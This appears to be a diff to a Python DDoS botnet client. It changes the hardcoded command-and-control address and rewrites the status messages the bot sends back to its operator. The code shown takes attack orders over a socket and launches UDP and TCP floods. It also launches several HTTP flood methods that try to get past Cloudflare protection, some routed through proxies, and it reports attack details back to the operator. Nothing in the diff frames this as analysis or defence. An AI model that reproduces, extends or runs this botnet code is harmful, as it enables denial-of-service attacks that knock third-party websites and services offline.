@@ -1981,7 +1981,7 @@ def kill_zombie():
 
 
 
-ip      = "192.168.0.2"
+ip      = "192.168.0.22"
 port    = 1888
 
 
@@ -2139,13 +2139,13 @@ class Client():
 
                     if method == "udp":
                         threading.Thread(target=runsender, args=(target, por_t, t, thread)).start()
-                        self.sock.send(f"{self.public_ip}    Sending UDP Attack".encode("ascii"))
+                        self.sock.send(f"Attack sent successfully\n\n\nAttack Infomation:\nIP: {data[1]}\nPort: {data[2]}\nAttack Method: {str(data[0]).lower()}\nAttack Time: {data[4]}\nThread Amount: {data[3]}\n".encode("ascii"))
                     
                     elif method == "tcp":
                         threading.Thread(target=runflooder, args=(target, por_t, t, thread)).start()
-                        self.sock.send(f"{self.public_ip}    Sending TCP Attack".encode("ascii"))
+                        self.sock.send(f"Attack sent successfully\n\n\nAttack Infomation:\nIP: {data[1]}\nPort: {data[2]}\nAttack Method: {str(data[0]).lower()}\nAttack Time: {data[4]}\nThread Amount: {data[3]}\n".encode("ascii"))
                     
-                    else: self.sock.send(f"{self.public_ip}    Invalid IP Method".encode("ascii"))
+                    else: self.sock.send(f"Invalid Attack Method {method}".encode("ascii"))
 
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))	
 
@@ -2159,28 +2159,28 @@ class Client():
 
 
                     if method == "cfb":
-                        self.sock.send(f"Attack sent successfully".encode("ascii"))
+                        self.sock.send(f"Attack sent successfully\n\n\nAttack Infomation:\nWebsite: {data[1]}\nAttack Method: {str(data[0]).lower()}\nAttack Time: {data[3]}\nThread Amount: {data[2]}\n".encode("ascii"))
                         LaunchCFB(target, thread, t)
                     
                     elif method == "pxcfb":
                         if get_proxies():
-                            self.sock.send(f"Attack sent successfully".encode("ascii"))
+                            self.sock.send(f"Attack sent successfully\n\n\nAttack Infomation:\nWebsite: {data[1]}\nAttack Method: {str(data[0]).lower()}\nAttack Time: {data[3]}\nThread Amount: {data[2]}\n".encode("ascii"))
                             LaunchPXCFB(target, thread, t, proxies)
-                        else: self.sock.send(f"You Need Proxy File ( proxy.txt )".encode("ascii"))
+                        else: self.sock.send(f"Failed to get proxies".encode("ascii"))
                     
                     elif method == "cfreq":
                         if get_cookie(target):
-                            self.sock.send(f"Attack sent successfully".encode("ascii"))
+                            self.sock.send(f"Attack sent successfully\n\n\nAttack Infomation:\nWebsite: {data[1]}\nAttack Method: {str(data[0]).lower()}\nAttack Time: {data[3]}\nThread Amount: {data[2]}\n".encode("ascii"))
                             LaunchCFPRO(target, thread, t)
                         else: self.sock.send(f"Failed to bypass cf".encode("ascii"))
                     
                     elif method == "cfsoc":
                         if get_cookie(target):
-                            self.sock.send(f"Attack sent successfully".encode("ascii"))
+                            self.sock.send(f"Attack sent successfully\n\n\nAttack Infomation:\nWebsite: {data[1]}\nAttack Method: {str(data[0]).lower()}\nAttack Time: {data[3]}\nThread Amount: {data[2]}\n".encode("ascii"))
                             LaunchCFSOC(target, thread, t)
                         else: self.sock.send(f"Failed to bypass cf".encode("ascii"))
                     
-                    else: self.sock.send(f"Invalid Website Method".encode("ascii"))
+                    else: self.sock.send(f"Invalid Attack Method: {method}".encode("ascii"))
                     
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
